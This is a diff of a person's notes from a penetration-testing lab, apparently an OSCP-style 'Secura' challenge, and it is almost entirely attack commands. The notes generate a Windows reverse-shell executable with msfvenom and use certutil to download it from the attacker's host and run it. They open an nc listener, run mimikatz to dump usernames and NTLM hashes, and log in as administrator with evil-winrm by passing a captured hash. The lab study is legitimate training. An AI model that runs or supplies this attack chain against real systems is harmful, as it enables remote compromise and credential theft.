@@ -9,11 +9,6 @@ A5B6GFs9S3demojceJUlXBjoKegdeFugQ2zbUsWwaPuvYAn2zh0uJq9gCfbOHS4midX9pupdJITEzi9O
 
 https://your-it-note.blogspot.com/2024/09/challenge-0-secura1.html
 
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.214 LPORT=443 -f exe -o reverse.exe
-vi cmd.bat
-certutil.exe -f -urlcache -split http://192.168.177.95/reverse.exe c:\windows\temp\reverse.exe && cmd.exe /c c:\windows\temp\reverse.exe
-sudo nc -lvp 443
-
 ┌──(kali㉿kali)-[~/lab0/95]
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.214 LPORT=443 -b '\x00\x01\x0d' -f exe -o revershell.exe
 vi cmd.bat
@@ -21,3 +16,17 @@ certutil.exe -f -urlcache -split http://192.168.45.214/lab0/95/revershell.exe c:
 sudo mkdir -p /var/www/html/lab0/95 && sudo mv revershell.exe /var/www/html/lab0/95/
 sudo python2 -m SimpleHTTPServer 80
 sudo nc -lvp 443 
+
+
+------
+C:\>dir /s local.txt //proof.txt //flag
+C:\Program Files\ManageEngine\AppManager14\working> tar -xf mimikatz.zip
+C:\Program Files\ManageEngine\AppManager14\working>cd "C:\Program Files\ManageEngine\AppManager14\working\mimikatz-master\x64" //dir also ok
+C:\Program Files\ManageEngine\AppManager14\working\mimikatz-master\x64>mimikatz.exe //get Username + NTLM Hash
+-------
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 192.168.212.95  -u administrator -H "a51493b0b06e5e35f855245e71af1d14"
+
+
+
+
